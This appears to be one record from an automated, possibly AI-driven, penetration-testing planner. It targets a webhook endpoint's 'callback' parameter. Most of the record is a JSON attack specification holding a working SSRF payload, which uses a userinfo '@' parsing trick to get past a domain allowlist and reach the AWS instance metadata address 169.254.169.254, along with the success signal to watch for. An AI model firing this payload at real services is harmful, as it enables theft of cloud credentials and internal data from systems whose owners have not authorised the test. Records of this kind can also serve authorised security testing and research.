Endpoint: GET /api/v1/webhook?callback=https://trusted-partner.com
Target parameter(s): callback
Recon evidence: The endpoint accepts HTTPS URLs from allowlisted domains; a test with https://trusted-partner.com returned 200 with the remote content.
Planner's rationale: Allowlist bypass via attacker-controlled subdomain of trusted-partner.com to reach internal metadata.

{"vuln_class": "ssrf", "target_param": "callback", "payload": "https://internal-metadata.trusted-partner.com@169.254.169.254/latest/meta-data/", "injection_point": "query", "expected_success_signal": "AWS IMDS response body containing instance metadata in the webhook response", "confidence": 0.75, "reasoning": "The userinfo parser discrepancy (evil@internal) places the attacker-controlled subdomain before @ while the actual host resolves to the IMDS IP; the allowlist check likely validates only the domain suffix."}
